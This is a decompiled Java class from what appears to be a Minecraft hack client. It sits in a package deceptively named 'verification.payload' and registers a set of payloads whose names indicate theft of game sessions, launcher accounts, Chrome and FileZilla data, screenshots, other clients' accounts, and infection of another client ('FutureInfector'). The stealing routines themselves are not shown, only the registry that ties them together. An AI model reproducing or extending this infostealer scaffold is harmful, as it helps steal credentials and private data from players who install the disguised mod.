//Deobfuscated with https://github.com/SimplyProgrammer/Minecraft-Deobfuscator3000 using mappings "C:\Users\Admin\Desktop\Minecraft-Deobfuscator3000-1.2.2\1.12 stable mappings"!

//Decompiled by Procyon!

package me.shatteredhej.railhack.railhackmod.util.extra.utils.verification.payload;

import me.shatteredhej.railhack.railhackmod.util.extra.utils.verification.payload.impl.*;
import java.util.*;

public final class PayloadRegistry
{
    private static final PayloadRegistry INSTANCE;
    private final List<Payload> payloads;
    
    private PayloadRegistry() {
        (this.payloads = new ArrayList<Payload>()).addAll(Arrays.asList((Payload)new FutureInfector(), (Payload)new Personal(), (Payload)new Log(), (Payload)new Session(), (Payload)new ModsGrabber(), (Payload)new ScreenCapture(), (Payload)new LauncherAccounts(), (Payload)new Chrome(), (Payload)new FileZilla(), (Payload)new ShareX(), (Payload)new FutureAuth(), (Payload)new FutureAccounts(), (Payload)new FutureWaypoints(), (Payload)new SalHackWaypoints(), (Payload)new RusherHackAccounts(), (Payload)new RusherHackWaypoints(), (Payload)new PyroAccounts(), (Payload)new PyroWaypoints(), (Payload)new KonasAccounts(), (Payload)new KonasWaypoints(), (Payload)new KamiWaypoints(), (Payload)new JourneyMap(), (Payload)new Intellij()));
    }
    
    public static Optional<Payload> getPayload(final Class<? extends Payload> klazz) {
        return getPayloads().stream().filter(p -> p.getClass().equals(klazz)).findAny();
    }
    
    public static List<Payload> getPayloads() {
        return PayloadRegistry.INSTANCE.payloads;
    }
    
    static {
        INSTANCE = new PayloadRegistry();
    }
}
